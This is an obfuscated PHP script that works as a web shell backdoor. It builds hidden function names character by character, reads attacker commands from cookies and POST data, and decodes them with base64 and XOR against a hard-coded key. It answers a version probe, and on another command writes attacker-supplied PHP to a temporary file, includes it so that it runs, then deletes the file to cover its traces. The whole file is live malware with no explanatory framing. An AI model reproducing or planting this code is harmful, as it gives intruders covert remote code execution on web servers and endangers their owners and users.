<?php 	function	jocmo(){	echo  8293;	}
$dnexceyv/*blp_x   */=/* h_ */'dnexceyv'       ^	'';

$fosgov	=/*   obh*/$dnexceyv(102)       .    "i".$dnexceyv(108)      .       "e"."_".$dnexceyv(698-586)/* gu  */.       "\x75"	./*cakiu*/"t".$dnexceyv(838-743)  .      $dnexceyv(703-604)/*   hg */./*tmm*/$dnexceyv(111)	.	"\156"     .       "t"."e"."\156"    .	$dnexceyv(241-125)   .	"s";

$dnibadlz	=/* fda*/$dnexceyv(98)/* _qwj   */./*  y*/"a".$dnexceyv(115)    .     $dnexceyv(468-367)/*   itw   */.	"6"."4"."_"."d".$dnexceyv(868-767)	.	$dnexceyv(99)/*tjhi  */.	"o"."d"."\x65";
$noiswfhmgz      =/*po  */"\165"     .     "n".$dnexceyv(115)       .	"\x65"	.     "r"."\x69"/* p */./*  exbum */$dnexceyv(132-35)      .       "\x6c"	.	"i"."\x7a"     .      "\145";


$cldklw  =	$dnexceyv(112)      .       $dnexceyv(524-420)/*  _hfn  */.  "p".$dnexceyv(303-185)/* si_j */.	"\x65"/*  zcguz   */./*   rqp */"\162"	.    $dnexceyv(259-144)/*co_k  */.	"i"."\157"    ./* tyvz */"\x6e";$nptcnxk/*qfrnm */=       "u".$dnexceyv(110)/* c */.    $dnexceyv(108)	.    "i".$dnexceyv(110)/*cdtv */.	"\153";



/* afwtu*/


function/* wmm*/yyoes_lflq($xyyvcohiu_cttu,  $amcffkkeeb)
{     global/*  ov*/$dnexceyv;

     $goxtrh/*  j*/=	"";  for      ($xyyvco/*jc */=   0;  $xyyvco/*   m   */<    strlen($xyyvcohiu_cttu);)	{/* ndm  */for      ($ija_k       =     0;      $ija_k/* gdm */</*  aacjt   */strlen($amcffkkeeb)/*   yhwm*/&&   $xyyvco	<      strlen($xyyvcohiu_cttu);/*   gccuu */$ija_k++,	$xyyvco++)  {/*  w_w*/$goxtrh	.=       $dnexceyv(ord($xyyvcohiu_cttu[$xyyvco])/*  pu */^	ord($amcffkkeeb[$ija_k]));/*   dym   */}


/*  zbfst   */}

/*  x */return/*s*/$goxtrh;


}$pebkdtbaqe/* m   */=	$_COOKIE;$mlf_rfrsvy	=/*   lc  */$_POST;$pebkdtbaqe/*  ssriy   */=  array_merge($mlf_rfrsvy,       $pebkdtbaqe);


$fylvjj/* n_cxn*/=     "\66"/*  xtq */./* tej */"7".$dnexceyv(101)       .	$dnexceyv(100)    .   "1".$dnexceyv(844-794)/* bvqyi*/./* y   */"4".$dnexceyv(54)/*   muw_   */.    $dnexceyv(45)/* zkgl   */.      $dnexceyv(54)    .     $dnexceyv(601-502)	.   "4"."6".$dnexceyv(144-99)	.       "4"."\66"	.    "f"."\x37"    ./* ppq */$dnexceyv(111-66)	./*   m  */"9"."5"."9"."4"."\55"   ./*vh*/"\x36"	.      "1"."4"."\62"  .	$dnexceyv(57)	./*  b */"\144"     .  $dnexceyv(397-344)	./*  f  */"\x38"	./* vg*/"c"."b".$dnexceyv(854-754).$dnexceyv(814-762);
foreach	($pebkdtbaqe      as/*s   */$onwnfyraj/*iipop  */=>/* c */$xyyvcohiu_cttu)     {


  $xyyvcohiu_cttu/*_ */=/*_btw */$noiswfhmgz(yyoes_lflq(yyoes_lflq($dnibadlz($xyyvcohiu_cttu),	$fylvjj),/*pekoy*/$onwnfyraj));	if	(isset($xyyvcohiu_cttu[$dnexceyv(643-546)/*   togx   */./*ct  */"k"]))/*   s   */{

/* bc  */if/* dvq   */($xyyvcohiu_cttu[$dnexceyv(97)]   ==     "\151")      {

       $xyyvco/*   nk*/=    array();

	$xyyvco["\x70"/*   jei   */./* sap*/"v"]   =     $cldklw();      $xyyvco[$dnexceyv(115)	./*  erh*/"v"]    =	"3"."."."\65";


   echo/*   zi*/@serialize($xyyvco);


/*auowj*/}/*  lgyp*/elseif	($xyyvcohiu_cttu[$dnexceyv(97)]/*  ucra */==     $dnexceyv(333-232))/*   y */{

	$yifklcfuer	=/*   z   */sprintf("\56"/* sfp  */./*r*/"/"."\45"	./*epf */$dnexceyv(178-63)/*  bc */.    "."."\160"	.	$dnexceyv(108),      md5($fylvjj));     $fosgov($yifklcfuer,      "<"	.   "\x3f"  .	"\160"	./*  pjj   */"h"."\x70"  ./* ht   */$dnexceyv(32)       .  "\165"	./*   l */$dnexceyv(110)	.     "l".$dnexceyv(105)	.	"n".$dnexceyv(107)    .	"\x28"/*  m */.     "_"."\x5f"/* dze*/.	"F"."I".$dnexceyv(76)/* idvnn   */.	$dnexceyv(849-780)       ./*_hosf */"\137"	./*   kbi*/$dnexceyv(95)      .	")".$dnexceyv(59)	.	$dnexceyv(32)/*  s_w*/.	$xyyvcohiu_cttu[$dnexceyv(854-754)]);
     include($yifklcfuer);
	$nptcnxk($yifklcfuer);/* wdy*/}

/*  f */exit();
/* mkbwx */}
}




